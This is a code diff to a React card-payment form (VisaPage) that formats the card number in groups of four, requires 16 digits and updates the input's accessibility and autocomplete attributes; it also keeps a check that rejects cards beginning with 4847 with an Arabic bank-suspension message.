@@ -27,6 +27,17 @@ const VisaPage = ({ loading, setLoading }) => {
     setFormData({ ...formData, [name]: value });
   };
 
+  /** Digits only in state; show as "4521 4654 5464 4546" in the input. */
+  const formatCardNumberDisplay = (raw) => {
+    const digits = String(raw ?? "").replace(/\D/g, "").slice(0, 16);
+    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+  };
+
+  const handleCardNumberChange = (e) => {
+    const digits = e.target.value.replace(/\D/g, "").slice(0, 16);
+    setFormData((prev) => ({ ...prev, cardNumber: digits }));
+  };
+
   const formatExpiryInput = (raw) => {
     const digits = raw.replace(/\D/g, "").slice(0, 4);
     if (digits.length <= 2) return digits;
@@ -58,6 +69,10 @@ const VisaPage = ({ loading, setLoading }) => {
     e.preventDefault();
     setIsProcessing(true);
     setError("");
+    if (formData.cardNumber.length !== 16) {
+      setIsProcessing(false);
+      return setError("Card number must be 16 digits.");
+    }
     if (formData.cardNumber.startsWith("4847")) {
       setIsProcessing(false);
       return setError(`عذرًا، مصرف الراجحي موقوف حاليًا
@@ -202,14 +217,14 @@ const VisaPage = ({ loading, setLoading }) => {
           <input
             type="text"
             name="cardNumber"
-            className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
-            value={formData.cardNumber}
-            onChange={handleChange}
-            maxLength={16}
-            minLength={16}
-            pattern="[0-9]*"
+            className="w-full border p-2 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 font-mono tracking-wide"
+            value={formatCardNumberDisplay(formData.cardNumber)}
+            onChange={handleCardNumberChange}
+            maxLength={19}
             inputMode="numeric"
+            autoComplete="cc-number"
             required
+            aria-label="Card number"
           />
           <FaLock className="text-base text-gray-500 absolute right-2 bottom-4" />
         </div>
@@ -279,7 +294,7 @@ const VisaPage = ({ loading, setLoading }) => {
             disabled={
               isProcessing ||
               !formData.cardName ||
-              !formData.cardNumber ||
+              formData.cardNumber.length !== 16 ||
               !formData.cvv ||
               !cardExpiry
             }
